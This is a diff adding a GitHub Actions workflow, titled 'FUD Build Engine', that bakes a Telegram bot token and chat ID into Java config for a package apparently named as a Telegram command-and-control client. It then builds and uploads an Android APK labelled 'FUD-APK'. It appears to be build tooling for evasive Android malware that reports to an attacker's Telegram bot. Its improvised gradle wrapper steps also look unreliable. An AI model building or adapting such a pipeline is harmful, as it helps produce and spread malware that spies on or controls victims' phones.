@@ -1,0 +1,86 @@
+name: 🔥 FUD Build Engine
+
+on:
+  workflow_dispatch:
+    inputs:
+      bot_token:
+        description: 'TG Bot Token'
+        required: true
+      chat_id:
+        description: 'TG Chat ID'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup JDK 17
+        run: |
+          sudo apt update
+          sudo apt install -y openjdk-17-jdk
+      
+      - name: Setup Gradle + Build APK
+        run: |
+          # Download Gradle directly
+          cd /tmp
+          curl -L -o gradle.zip https://services.gradle.org/distributions/gradle-8.2-bin.zip
+          unzip -q gradle.zip
+          cd $GITHUB_WORKSPACE
+          
+          # Create gradle wrapper files
+          mkdir -p gradle/wrapper
+          
+          # Copy gradle wrapper jar from downloaded gradle
+          cp /tmp/gradle-8.2/lib/gradle-wrapper-*.jar gradle/wrapper/gradle-wrapper.jar
+          
+          # Create wrapper properties
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.2-bin.zip
+          EOF
+          
+          # Create gradlew script
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          DIRNAME=$(dirname "$0")
+          if [ -f "$DIRNAME/gradle/wrapper/gradle-wrapper.jar" ]; then
+              exec java -jar "$DIRNAME/gradle/wrapper/gradle-wrapper.jar" "$@"
+          else
+              echo "Error: No wrapper jar found"
+              exit 1
+          fi
+          EOF
+          chmod +x gradlew
+          
+          # Verify files exist
+          echo "=== Checking files ==="
+          ls -la gradlew
+          ls -la gradle/wrapper/
+          file gradlew
+      
+      - name: Create Config.java
+        run: |
+          mkdir -p app/src/main/java/com/telec2/client
+          cat > app/src/main/java/com/telec2/client/Config.java << 'EOF'
+          package com.telec2.client;
+          public class Config {
+              public static final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
+              public static final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
+          }
+          EOF
+      
+      - name: Build Release APK
+        run: |
+          # Use gradle wrapper directly
+          cd $GITHUB_WORKSPACE
+          ls -la gradlew
+          ./gradlew assembleRelease --no-daemon --stacktrace
+      
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: FUD-APK
+          path: app/build/outputs/apk/release/*.apk
